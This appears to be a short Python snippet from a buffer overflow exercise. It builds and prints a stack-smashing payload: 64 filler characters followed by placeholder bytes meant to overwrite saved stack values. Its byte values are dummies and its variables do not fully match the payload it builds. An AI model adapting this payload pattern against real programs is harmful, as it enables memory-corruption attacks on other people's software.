Stack = 0x50 #80
Buffer = "a" * 64
MDF = "\x66" * 4
EBP = "\x99" * 4
payload = "a" * 64 + "\x66" * 4 + "\x88" * 8 +"\x99" * 4
print(payload)